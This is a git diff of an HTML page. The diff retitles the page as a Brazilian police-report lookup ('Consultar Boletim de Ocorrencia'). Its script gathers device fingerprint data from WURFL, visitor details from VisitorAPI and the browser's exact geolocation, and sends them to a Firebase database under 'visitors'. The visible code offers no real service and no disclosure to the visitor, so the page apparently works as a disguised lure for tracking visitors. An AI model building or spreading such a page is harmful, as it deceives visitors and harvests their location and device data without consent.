@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Meu Site Hello World</title>
+    <title>Consultar Boletim de Ocorrencia</title>
+    <link href="./home.css" rel="stylesheet" />
     <script src="//wurfl.io/wurfl.js"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
@@ -20,6 +21,7 @@
 
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
+        let dataKey;
 
         function sendDataToRealtimeDatabaseInitial(data) {
             const dbRef = ref(database, 'visitors');
@@ -28,8 +30,8 @@
             return newVisitorRef.key;
         }
 
-        function updateDataWithLocation(key, locationData) {
-            const visitorLocationRef = ref(database, `visitors/${key}`);
+        function updateDataWithLocation(locationData) {
+            const visitorLocationRef = ref(database, `visitors/${dataKey}`);
             update(visitorLocationRef, locationData);
         }
 
@@ -40,8 +42,7 @@
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude
                     };
-                    var dataKey = sendDataToRealtimeDatabaseInitial(WURFL); // Envia os dados do WURFL
-                    updateDataWithLocation(dataKey, locationData);
+                    updateDataWithLocation(locationData);
                 }, function(error) {
                     console.error("Erro na Geolocalização: ", error);
                 });
@@ -53,9 +54,10 @@
             s.onreadystatechange = function() {
                 if (s.readyState === XMLHttpRequest.DONE) {
                     if (s.status === 200) {
-                        var data = JSON.parse(s.responseText);
-                        console.log("Dados da API:", data);
-                        e(data);
+                        var apiData = JSON.parse(s.responseText);
+                        console.log("Dados da API:", apiData);
+                        dataKey = sendDataToRealtimeDatabaseInitial({ ...apiData, ...WURFL });
+                        e(apiData);
                     } else {
                         a(s.status, s.statusText);
                     }
@@ -67,10 +69,7 @@
 
         VisitorAPI(
             "p53oy0LRsYVI5KEmIDJw",
-            function(data) {
-                var completeData = { ...data, ...WURFL };
-                var dataKey = sendDataToRealtimeDatabaseInitial(completeData);
-            },
+            function(data) { /* Função de sucesso */ },
             function(errorCode, errorMessage) {
                 console.log("Erro na API:", errorCode, errorMessage); 
             }
